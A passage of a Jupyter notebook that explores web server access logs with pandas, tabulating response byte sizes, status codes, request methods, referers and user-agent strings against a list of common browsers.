       "824291  /es/lnk35/pl349/noticies/id418/el-terramar-aca...     504    353   \n",
       "\n",
       "       referer                                         user-agent  level  \n",
       "824291       -  Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Ge...      5  "
      ]
     },
     "execution_count": 18,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "df[df[\"status\"] == 504]"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Bytes"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 23,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 640x480 with 1 Axes>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "df[\"bytes\"].hist(bins=100, log=True)\n",
    "plt.xlabel(\"Bytes\")\n",
    "plt.ylabel(\"number of logs\")\n",
    "plt.show()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 46,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "count    1.077393e+06\n",
       "mean     2.274591e+04\n",
       "std      3.167080e+05\n",
       "min      0.000000e+00\n",
       "25%      1.170000e+03\n",
       "50%      3.914000e+03\n",
       "75%      1.104000e+04\n",
       "max      4.901960e+07\n",
       "Name: bytes, dtype: float64"
      ]
     },
     "execution_count": 46,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "df[\"bytes\"].describe()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 50,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "bytes\n",
       "32076         1\n",
       "187352        1\n",
       "80321         1\n",
       "7720          1\n",
       "22967         1\n",
       "          ...  \n",
       "5688      14921\n",
       "23991     15013\n",
       "11214     15018\n",
       "13959     15103\n",
       "454       18653\n",
       "Name: count, Length: 27566, dtype: int64"
      ]
     },
     "execution_count": 50,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "df[\"bytes\"].value_counts().sort_values()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 47,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "count    27566.000000\n",
       "mean        39.084125\n",
       "std        516.581984\n",
       "min          1.000000\n",
       "25%          1.000000\n",
       "50%          2.000000\n",
       "75%          7.000000\n",
       "max      18653.000000\n",
       "Name: count, dtype: float64"
      ]
     },
     "execution_count": 47,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "df[\"bytes\"].value_counts().describe()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 63,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "<1KB: 20.48%\n",
      "1KB-1MB: 79.33%\n",
      ">1MB: 0.18%\n"
     ]
    },
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 640x480 with 1 Axes>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "kb = len(df[df[\"bytes\"] < 1e3])\n",
    "mb = len(df[(df[\"bytes\"] >= 1e3) & (df[\"bytes\"] < 1e6)])\n",
    "gb = len(df[df[\"bytes\"] >= 1e6])\n",
    "# make an histogram of that\n",
    "plt.bar([\"<1KB\", \"1KB-1MB\", \">1MB\"], [kb, mb, gb])\n",
    "plt.xlabel(\"Bytes\")\n",
    "plt.ylabel(\"number of logs\")\n",
    "print(f\"<1KB: {kb/len(df)*100:.2f}%\")\n",
    "print(f\"1KB-1MB: {mb/len(df)*100:.2f}%\")\n",
    "print(f\">1MB: {gb/len(df)*100:.2f}%\")\n",
    "plt.show()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 27,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "petition\n",
       "GET        49019604\n",
       "OPTIONS       80600\n",
       "POST          62351\n",
       "HEAD           6419\n",
       "-              6151\n",
       "CONNECT         537\n",
       "USER            421\n",
       "Name: bytes, dtype: int64"
      ]
     },
     "execution_count": 27,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "df.groupby(\"petition\")[\"bytes\"].max().sort_values(ascending=False)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 73,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>absolute</th>\n",
       "      <th>relative</th>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>petition</th>\n",
       "      <th></th>\n",
       "      <th></th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>GET</th>\n",
       "      <td>1684</td>\n",
       "      <td>94.4</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>POST</th>\n",
       "      <td>57</td>\n",
       "      <td>3.2</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>-</th>\n",
       "      <td>42</td>\n",
       "      <td>2.4</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>HEAD</th>\n",
       "      <td>1</td>\n",
       "      <td>0.1</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "          absolute  relative\n",
       "petition                    \n",
       "GET           1684      94.4\n",
       "POST            57       3.2\n",
       "-               42       2.4\n",
       "HEAD             1       0.1"
      ]
     },
     "execution_count": 73,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "abs_status = df[df[\"bytes\"] == 0][\"petition\"].value_counts()\n",
    "rel_status = df[df[\"bytes\"] == 0][\"petition\"].value_counts(normalize=True).round(3)*100\n",
    "pd.concat([abs_status, rel_status], axis=1, keys=[\"absolute\", \"relative\"])"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 72,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>absolute</th>\n",
       "      <th>relative</th>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>status</th>\n",
       "      <th></th>\n",
       "      <th></th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>200</th>\n",
       "      <td>1687</td>\n",
       "      <td>94.6</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>408</th>\n",
       "      <td>42</td>\n",
       "      <td>2.4</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>301</th>\n",
       "      <td>34</td>\n",
       "      <td>1.9</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>404</th>\n",
       "      <td>14</td>\n",
       "      <td>0.8</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>206</th>\n",
       "      <td>4</td>\n",
       "      <td>0.2</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>400</th>\n",
       "      <td>3</td>\n",
       "      <td>0.2</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "        absolute  relative\n",
       "status                    \n",
       "200         1687      94.6\n",
       "408           42       2.4\n",
       "301           34       1.9\n",
       "404           14       0.8\n",
       "206            4       0.2\n",
       "400            3       0.2"
      ]
     },
     "execution_count": 72,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "abs_status = df[df[\"bytes\"] == 0][\"status\"].value_counts()\n",
    "rel_status = df[df[\"bytes\"] == 0][\"status\"].value_counts(normalize=True).round(3)*100\n",
    "pd.concat([abs_status, rel_status], axis=1, keys=[\"absolute\", \"relative\"])"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 76,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Requests with 0 bytes\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "status  petition\n",
       "200     GET         1632\n",
       "        POST          54\n",
       "        HEAD           1\n",
       "206     GET            4\n",
       "301     GET           34\n",
       "400     POST           3\n",
       "404     GET           14\n",
       "408     -             42\n",
       "Name: count, dtype: int64"
      ]
     },
     "execution_count": 76,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "print(\"Requests with 0 bytes\")\n",
    "df[df[\"bytes\"] == 0].groupby(\"status\")[\"petition\"].value_counts()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 71,
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "/tmp/ipykernel_6891/3999668823.py:2: FutureWarning: The default of observed=False is deprecated and will be changed to True in a future version of pandas. Pass observed=False to retain current behavior or observed=True to adopt the future default and silence this warning.\n",
      "  gr = pd.concat([intervals, df[\"status\"]], axis=1).groupby(\"bytes\")[\"status\"]\n"
     ]
    },
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th></th>\n",
       "      <th>absolute</th>\n",
       "      <th>relative</th>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>bytes</th>\n",
       "      <th>status</th>\n",
       "      <th></th>\n",
       "      <th></th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th rowspan=\"11\" valign=\"top\">&lt;1KB</th>\n",
       "      <th>200</th>\n",
       "      <td>164918</td>\n",
       "      <td>75.3</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>301</th>\n",
       "      <td>52300</td>\n",
       "      <td>23.9</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>404</th>\n",
       "      <td>774</td>\n",
       "      <td>0.4</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>400</th>\n",
       "      <td>251</td>\n",
       "      <td>0.1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>403</th>\n",
       "      <td>240</td>\n",
       "      <td>0.1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>304</th>\n",
       "      <td>194</td>\n",
       "      <td>0.1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>302</th>\n",
       "      <td>142</td>\n",
       "      <td>0.1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>206</th>\n",
       "      <td>63</td>\n",
       "      <td>0.0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>408</th>\n",
       "      <td>2</td>\n",
       "      <td>0.0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>504</th>\n",
       "      <td>1</td>\n",
       "      <td>0.0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>401</th>\n",
       "      <td>1</td>\n",
       "      <td>0.0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th rowspan=\"11\" valign=\"top\">1KB-1MB</th>\n",
       "      <th>200</th>\n",
       "      <td>784618</td>\n",
       "      <td>91.8</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>301</th>\n",
       "      <td>40276</td>\n",
       "      <td>4.7</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>404</th>\n",
       "      <td>28693</td>\n",
       "      <td>3.4</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>304</th>\n",
       "      <td>530</td>\n",
       "      <td>0.1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>206</th>\n",
       "      <td>248</td>\n",
       "      <td>0.0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>408</th>\n",
       "      <td>195</td>\n",
       "      <td>0.0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>403</th>\n",
       "      <td>87</td>\n",
       "      <td>0.0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>400</th>\n",
       "      <td>55</td>\n",
       "      <td>0.0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>302</th>\n",
       "      <td>37</td>\n",
       "      <td>0.0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>401</th>\n",
       "      <td>0</td>\n",
       "      <td>0.0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>504</th>\n",
       "      <td>0</td>\n",
       "      <td>0.0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th rowspan=\"11\" valign=\"top\">&gt;1MB</th>\n",
       "      <th>200</th>\n",
       "      <td>1570</td>\n",
       "      <td>79.1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>206</th>\n",
       "      <td>414</td>\n",
       "      <td>20.9</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>301</th>\n",
       "      <td>0</td>\n",
       "      <td>0.0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>302</th>\n",
       "      <td>0</td>\n",
       "      <td>0.0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>304</th>\n",
       "      <td>0</td>\n",
       "      <td>0.0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>400</th>\n",
       "      <td>0</td>\n",
       "      <td>0.0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>401</th>\n",
       "      <td>0</td>\n",
       "      <td>0.0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>403</th>\n",
       "      <td>0</td>\n",
       "      <td>0.0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>404</th>\n",
       "      <td>0</td>\n",
       "      <td>0.0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>408</th>\n",
       "      <td>0</td>\n",
       "      <td>0.0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>504</th>\n",
       "      <td>0</td>\n",
       "      <td>0.0</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "                absolute  relative\n",
       "bytes   status                    \n",
       "<1KB    200       164918      75.3\n",
       "        301        52300      23.9\n",
       "        404          774       0.4\n",
       "        400          251       0.1\n",
       "        403          240       0.1\n",
       "        304          194       0.1\n",
       "        302          142       0.1\n",
       "        206           63       0.0\n",
       "        408            2       0.0\n",
       "        504            1       0.0\n",
       "        401            1       0.0\n",
       "1KB-1MB 200       784618      91.8\n",
       "        301        40276       4.7\n",
       "        404        28693       3.4\n",
       "        304          530       0.1\n",
       "        206          248       0.0\n",
       "        408          195       0.0\n",
       "        403           87       0.0\n",
       "        400           55       0.0\n",
       "        302           37       0.0\n",
       "        401            0       0.0\n",
       "        504            0       0.0\n",
       ">1MB    200         1570      79.1\n",
       "        206          414      20.9\n",
       "        301            0       0.0\n",
       "        302            0       0.0\n",
       "        304            0       0.0\n",
       "        400            0       0.0\n",
       "        401            0       0.0\n",
       "        403            0       0.0\n",
       "        404            0       0.0\n",
       "        408            0       0.0\n",
       "        504            0       0.0"
      ]
     },
     "execution_count": 71,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "intervals = pd.cut(df[\"bytes\"], bins=[0, 1e3, 1e6, 1e9], labels=[\"<1KB\", \"1KB-1MB\", \">1MB\"])\n",
    "gr = pd.concat([intervals, df[\"status\"]], axis=1).groupby(\"bytes\")[\"status\"]\n",
    "abs_status = gr.value_counts()\n",
    "rel_status = gr.value_counts(normalize=True).round(3)*100\n",
    "pd.concat([abs_status, rel_status], axis=1, keys=[\"absolute\", \"relative\"])"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Referer"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 85,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "18.787202070182378"
      ]
     },
     "execution_count": 85,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "len(df[df[\"referer\"] == \"-\"]) / len(df) * 100"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 89,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>absolute</th>\n",
       "      <th>relative</th>\n",
       "      <th>relative to total</th>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>level</th>\n",
       "      <th></th>\n",
       "      <th></th>\n",
       "      <th></th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>175038</td>\n",
       "      <td>86.5</td>\n",
       "      <td>16.7</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>5</th>\n",
       "      <td>25412</td>\n",
       "      <td>12.6</td>\n",
       "      <td>95.1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>10</th>\n",
       "      <td>1413</td>\n",
       "      <td>0.7</td>\n",
       "      <td>86.1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>-1</th>\n",
       "      <td>435</td>\n",
       "      <td>0.2</td>\n",
       "      <td>100.0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>6</th>\n",
       "      <td>103</td>\n",
       "      <td>0.1</td>\n",
       "      <td>97.2</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>7</th>\n",
       "      <td>7</td>\n",
       "      <td>0.0</td>\n",
       "      <td>100.0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>15</th>\n",
       "      <td>3</td>\n",
       "      <td>0.0</td>\n",
       "      <td>100.0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>1</td>\n",
       "      <td>0.0</td>\n",
       "      <td>0.1</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "       absolute  relative  relative to total\n",
       "level                                       \n",
       " 0       175038      86.5               16.7\n",
       " 5        25412      12.6               95.1\n",
       " 10        1413       0.7               86.1\n",
       "-1          435       0.2              100.0\n",
       " 6          103       0.1               97.2\n",
       " 7            7       0.0              100.0\n",
       " 15           3       0.0              100.0\n",
       " 3            1       0.0                0.1"
      ]
     },
     "execution_count": 89,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "abs_level = df[df[\"referer\"] == \"-\"][\"level\"].value_counts()\n",
    "rel_level = df[df[\"referer\"] == \"-\"][\"level\"].value_counts(normalize=True).round(3)*100\n",
    "rel_total_level = (abs_level / df[\"level\"].value_counts()).round(3)*100\n",
    "pd.concat([abs_level, rel_level, rel_total_level], axis=1, keys=[\"absolute\", \"relative\", \"relative to total\"])"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 106,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "80.2051804680372"
      ]
     },
     "execution_count": 106,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "contains = \"sitges\"\n",
    "sitges = df[\"referer\"].apply(lambda x: contains in str(x))\n",
    "sitges.sum() / len(df) * 100"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 108,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "referer\n",
       "-                                               202412\n",
       "https://www.google.com/                           8024\n",
       "https://www.google.es/                             333\n",
       "https://www.google.co.uk/                          188\n",
       "www.google.com                                     186\n",
       "                                                 ...  \n",
       "https://nl.search.yahoo.com/                         1\n",
       "https://workona.com/                                 1\n",
       "https://91.134.184.72:443/sslvpn_logon.shtml         1\n",
       "https://healthyhouses.es/                            1\n",
       "https://www.google.com                               1\n",
       "Name: count, Length: 347, dtype: int64"
      ]
     },
     "execution_count": 108,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "df[~sitges][\"referer\"].value_counts()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 111,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "level\n",
       "0     861203\n",
       "3       1571\n",
       "5       1122\n",
       "10       226\n",
       "6          3\n",
       "Name: count, dtype: int64"
      ]
     },
     "execution_count": 111,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "df[sitges][\"level\"].value_counts()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## User-agent"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 120,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3928.157 Safari/537.36'"
      ]
     },
     "execution_count": 120,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "df[\"user-agent\"][0]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 118,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "user-agent\n",
       "Mozilla                   1044645\n",
       "ClaudeBot                   20918\n",
       "PhxBot                       1997\n",
       "Googlebot                    1559\n",
       "facebookexternalhit          1291\n",
       "                           ...   \n",
       "Lync                            1\n",
       "AndroidDownloadManager          1\n",
       "HTTP                            1\n",
       "masscan                         1\n",
       "ActionExtension2                1\n",
       "Name: count, Length: 104, dtype: int64"
      ]
     },
     "execution_count": 118,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "df[\"user-agent\"].apply(lambda x: re.split(r\"\\W\", str(x), maxsplit=1)[0]).value_counts()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 21,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>user-agent</th>\n",
       "      <th>share</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>Mozilla/5.0 (Windows NT 10.0; Win64; x64) Appl...</td>\n",
       "      <td>24.31</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7...</td>\n",
       "      <td>23.33</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7...</td>\n",
       "      <td>14.12</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6...</td>\n",
       "      <td>13.92</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>Mozilla/5.0 (Windows NT 10.0; Win64; x64) Appl...</td>\n",
       "      <td>3.92</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "                                          user-agent  share\n",
       "0  Mozilla/5.0 (Windows NT 10.0; Win64; x64) Appl...  24.31\n",
       "1  Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7...  23.33\n",
       "2  Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7...  14.12\n",
       "3  Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6...  13.92\n",
       "4  Mozilla/5.0 (Windows NT 10.0; Win64; x64) Appl...   3.92"
      ]
     },
     "execution_count": 21,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "common_useragents = pd.read_csv(os.path.join(ROOT_DIR, \"data/common_useragents.csv\"))\n",
    "common_useragents.head()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 23,
   "metadata": {},
   "outputs": [],
   "source": [
    "is_common = df[\"user-agent\"].apply(lambda x: str(x) in common_useragents[\"user-agent\"].values)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 25,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "0.00018563328330516347"
      ]
     },
     "execution_count": 25,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "is_common.sum() / len(df) * 100"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 41,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'Mozilla/<v> (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/<v> (KHTML, like Gecko) Version/<v> Safari/<v>'"
      ]
     },
     "execution_count": 41,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "subst_pattern = (r\"/[\\d\\.]*\", \"/<v>\")\n",
    "common_useragents[\"user-agent\"].apply(lambda x: re.sub(subst_pattern[0], subst_pattern[1], x))[1]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 40,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3.1 Safari/605.1.1'"
      ]
     },
     "execution_count": 40,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "common_useragents[\"user-agent\"][1]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 56,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3.1 Safari/605.1.1\n",
      "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Safari/605.1.1\n",
      "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.3\n",
      "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3.1 Mobile/15E148 Safari/604.\n",
      "Mozilla/5.0 (iPhone; CPU iPhone OS 16_7_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.\n",
      "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1.2 Mobile/15E148 Safari/604.\n",
      "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/122.0.6261.89 Mobile/15E148 Safari/604.\n",
      "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) GSA/305.1.610629488 Mobile/15E148 Safari/604.\n",
      "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/122.0.6261.89 Mobile/15E148 Safari/604.\n",
      "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Mobile/15E148 Safari/604.\n",
      "Mozilla/5.0 (iPhone; CPU iPhone OS 16_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/122.0.6261.89 Mobile/15E148 Safari/604.\n",
      "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.\n",
      "Mozilla/5.0 (iPhone; CPU iPhone OS 15_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) GSA/305.1.610629488 Mobile/15E148 Safari/604.\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "[None, None, None, None, None, None, None, None, None, None, None, None, None]"
      ]
     },
     "execution_count": 56,
     "metadata": {},
